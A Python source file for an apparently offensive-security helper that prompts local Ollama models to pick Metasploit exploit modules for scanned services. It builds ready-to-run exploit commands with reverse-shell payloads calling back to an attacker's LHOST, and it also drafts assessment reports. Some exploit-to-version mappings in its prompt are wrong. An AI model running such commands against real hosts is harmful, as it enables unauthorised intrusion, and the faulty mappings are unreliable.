#!/usr/bin/env python3
"""
Local AI System using Ollama
Replaces unreliable cloud APIs with local models for exploit analysis and report generation
"""

import ollama
import json
from typing import Dict, Any, List
from datetime import datetime
import re


class LocalAISystem:
    """Local AI system using Ollama for cybersecurity analysis"""
    
    def __init__(self):
        self.exploit_model = "codellama:7b-instruct"
        self.report_model = "mistral:7b-instruct"
        self.base_url = "http://127.0.0.1:11434"
        
    def test_connection(self) -> bool:
        """Test if Ollama is running and models are available"""
        try:
            # First test if Ollama is running
            models_response = ollama.list()
            print(f"🔧 Raw response: {models_response}")
            
            # Handle the actual response format from ollama
            available_models = []
            
            # The response has a 'models' attribute with a list of Model objects
            if hasattr(models_response, 'models'):
                models_list = models_response.models
            elif isinstance(models_response, dict) and 'models' in models_response:
                models_list = models_response['models']
            else:
                models_list = []
            
            # Extract model names from Model objects
            for model in models_list:
                if hasattr(model, 'model'):  # Model object with .model attribute
                    model_name = model.model
                elif isinstance(model, dict):
                    model_name = model.get('name', model.get('model', str(model)))
                else:
                    model_name = str(model)
                available_models.append(model_name)
            
            has_exploit_model = any(self.exploit_model in model for model in available_models)
            has_report_model = any(self.report_model in model for model in available_models)
            
            print(f"🤖 Available models: {available_models}")
            print(f"✅ Exploit model ({self.exploit_model}): {has_exploit_model}")
            print(f"✅ Report model ({self.report_model}): {has_report_model}")
            
            return has_exploit_model and has_report_model
        except Exception as e:
            print(f"❌ Ollama connection failed: {e}")
            print(f"❌ Error type: {type(e)}")
            return False

    def generate_metasploit_exploit(self, service_data: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Metasploit exploit recommendations using CodeLlama"""
        
        service = service_data.get('service', 'unknown')
        product = service_data.get('product', 'unknown')
        version = service_data.get('version', 'unknown')
        port = service_data.get('port', 'unknown')
        host = service_data.get('host', 'unknown')
        
        prompt = f"""You are a penetration testing expert. Analyze this service and recommend the EXACT Metasploit module path.

Service Information:
- Service: {service}
- Product: {product}
- Version: {version}
- Port: {port}
- Host: {host}

Common exploit patterns:
- vsftpd 2.3.4 → exploit/unix/ftp/vsftpd_234_backdoor
- Samba 3.0.20 → exploit/linux/samba/lsa_transnames_heap  
- Apache 2.2.x → exploit/linux/http/apache_mod_rewrite_ldap
- OpenSSH < 7.4 → exploit/linux/ssh/libssh_auth_bypass
- ProFTPD 1.3.x → exploit/linux/ftp/proftp_sreplace
- MySQL 5.x → exploit/linux/mysql/mysql_yassl_hello

Respond with ONLY valid JSON (no markdown, no explanations):
{{
    "exploit_module": "exploit/category/service/specific_module",
    "payload": "payload/platform/type", 
    "confidence": "high|medium|low",
    "reasoning": "brief technical explanation",
    "target_info": {{
        "RHOSTS": "{host}",
        "RPORT": {port}
    }}
}}"""

        try:
            print(f"🤖 Analyzing {service} {product} {version} with local AI...")
            
            response = ollama.chat(
                model=self.exploit_model,
                messages=[{
                    'role': 'user', 
                    'content': prompt
                }],
                options={
                    'temperature': 0.1,  # Low temperature for consistent results
                    'top_p': 0.9,
                    'num_predict': 300   # Limit response length
                }
            )
            
            content = response['message']['content'].strip()
            
            # Clean up response if it has markdown formatting
            if content.startswith('```json'):
                content = content.replace('```json', '').replace('```', '').strip()
            if content.startswith('```'):
                content = content.replace('```', '').strip()
            
            # Parse JSON response
            try:
                result = json.loads(content)
            except json.JSONDecodeError:
                # Try to extract JSON from response
                json_match = re.search(r'\{.*\}', content, re.DOTALL)
                if json_match:
                    result = json.loads(json_match.group())
                else:
                    raise ValueError("No valid JSON found in response")
            
            # Build command sequence
            exploit_module = result.get('exploit_module', 'exploit/multi/handler')
            payload = result.get('payload', 'payload/generic/shell_reverse_tcp')
            
            commands = [
                f"use {exploit_module}",
                f"set RHOSTS {host}",
                f"set RPORT {port}"
            ]
            
            if payload and payload != "":
                commands.append(f"set payload {payload}")
                
            # Add common options
            commands.extend([
                "set LHOST YOUR_IP",
                "set LPORT 4444",
                "check",
                "exploit"
            ])
            
            result['commands'] = commands
            result['ai_source'] = 'local_ollama'
            result['model_used'] = self.exploit_model
            
            print(f"✅ Local AI result: {exploit_module}")
            return result
            
        except Exception as e:
            print(f"❌ Local AI Error: {e}")
            return {
                "exploit_module": "exploit/multi/handler",
                "payload": "payload/generic/shell_reverse_tcp",
                "confidence": "low",
                "reasoning": f"Local AI error: {str(e)}",
                "target_info": {
                    "RHOSTS": host,
                    "RPORT": port
                },
                "commands": [
                    "use exploit/multi/handler",
                    f"set RHOSTS {host}",
                    f"set RPORT {port}",
                    "set payload payload/generic/shell_reverse_tcp",
                    "exploit"
                ],
                "ai_source": "fallback",
                "error": str(e)
            }

    def generate_report_section(self, section_type: str, data: Dict[str, Any]) -> str:
        """Generate professional report sections using Mistral"""
        
        prompts = {
            'executive_summary': f"""Write a professional executive summary for a cybersecurity vulnerability assessment report.

Target Information:
- Host: {data.get('target_host', 'Unknown')}
- Services Found: {len(data.get('services', []))}
- Total CVEs: {data.get('total_cves', 0)}
- High/Critical CVEs: {data.get('critical_cves', 0)}
- Risk Level: {data.get('risk_level', 'Unknown')}

Write 2-3 paragraphs in professional business language suitable for C-level executives. Focus on business impact and risk. Do not use stars or amateur formatting.""",

            'technical_findings': f"""Write a technical findings section for a vulnerability assessment report.

Vulnerability Data:
- Total vulnerabilities: {data.get('total_cves', 0)}
- Critical: {data.get('severity_breakdown', {}).get('CRITICAL', 0)}
- High: {data.get('severity_breakdown', {}).get('HIGH', 0)}
- Medium: {data.get('severity_breakdown', {}).get('MEDIUM', 0)}
- Low: {data.get('severity_breakdown', {}).get('LOW', 0)}

Services: {', '.join([s.get('service', 'unknown') for s in data.get('services', [])])}

Write detailed technical analysis in professional cybersecurity language. Use proper markdown headers.""",

            'remediation_strategy': f"""Write a comprehensive remediation strategy section for a cybersecurity report.

Current Risk Profile:
- Risk Level: {data.get('risk_level', 'Unknown')}
- Priority Services: {', '.join([s.get('service', 'unknown') for s in data.get('services', [])[:3]])}
- Immediate Threats: {data.get('critical_cves', 0)} critical vulnerabilities

Write actionable remediation steps organized by priority (Immediate, Short-term, Long-term). Use professional language."""
        }
        
        if section_type not in prompts:
            return f"## {section_type.replace('_', ' ').title()}\n\nSection content will be generated here.\n\n"
            
        try:
            response = ollama.chat(
                model=self.report_model,
                messages=[{
                    'role': 'system', 
                    'content': 'You are a professional cybersecurity consultant writing formal assessment reports. Write in clear, professional business language without amateur formatting like stars.'
                }, {
                    'role': 'user', 
                    'content': prompts[section_type]
                }],
                options={
                    'temperature': 0.3,  # Slightly higher for creative writing
                    'top_p': 0.9,
                    'num_predict': 800   # Longer responses for reports
                }
            )
            
            content = response['message']['content'].strip()
            return content
            
        except Exception as e:
            print(f"❌ Report AI Error: {e}")
            return f"## {section_type.replace('_', ' ').title()}\n\nContent generation failed: {str(e)}\n\n"

    def enhance_vulnerability_analysis(self, vulnerability_data: Dict[str, Any]) -> str:
        """Use AI to enhance vulnerability analysis with professional insights"""
        
        prompt = f"""Analyze these vulnerability findings and provide professional cybersecurity insights:

Vulnerability Summary:
- Total Vulnerabilities: {vulnerability_data.get('total_vulnerabilities', 0)}
- Critical Severity: {vulnerability_data.get('critical_count', 0)}
- High Severity: {vulnerability_data.get('high_count', 0)}
- Services Affected: {vulnerability_data.get('affected_services', 0)}
- Average CVSS Score: {vulnerability_data.get('avg_cvss', 0)}

Top Vulnerabilities:
{vulnerability_data.get('top_vulnerabilities', 'None listed')}

Provide a professional analysis focusing on:
1. Overall security posture assessment
2. Business risk implications  
3. Attack surface analysis
4. Prioritization recommendations

Write in professional cybersecurity consultant language."""

        try:
            response = ollama.chat(
                model=self.report_model,
                messages=[{
                    'role': 'system',
                    'content': 'You are a senior cybersecurity consultant providing expert analysis for enterprise clients.'
                }, {
                    'role': 'user',
                    'content': prompt
                }],
                options={
                    'temperature': 0.4,
                    'top_p': 0.9,
                    'num_predict': 600
                }
            )
            
            return response['message']['content'].strip()
            
        except Exception as e:
            print(f"❌ Analysis AI Error: {e}")
            return "Professional vulnerability analysis could not be generated due to AI service error."


# Global instance for easy import
local_ai = LocalAISystem()


# Test function
def test_local_ai():
    """Test the local AI system"""
    print("🔧 Testing Local AI System...")
    
    # Test connection
    if not local_ai.test_connection():
        print("❌ Local AI not ready")
        return False
    
    # Test exploit generation
    test_service = {
        'service': 'ftp',
        'product': 'vsftpd',
        'version': '2.3.4',
        'port': 21,
        'host': '192.168.1.100'
    }
    
    print("\n🎯 Testing exploit generation...")
    result = local_ai.generate_metasploit_exploit(test_service)
    print(f"Result: {result}")
    
    # Test report generation
    test_data = {
        'target_host': '192.168.1.100',
        'services': [{'service': 'ftp', 'product': 'vsftpd'}],
        'total_cves': 5,
        'critical_cves': 2,
        'risk_level': 'HIGH'
    }
    
    print("\n📄 Testing report generation...")
    summary = local_ai.generate_report_section('executive_summary', test_data)
    print(f"Summary: {summary[:200]}...")
    
    print("\n✅ Local AI system test complete!")
    return True


if __name__ == "__main__":
    test_local_ai()
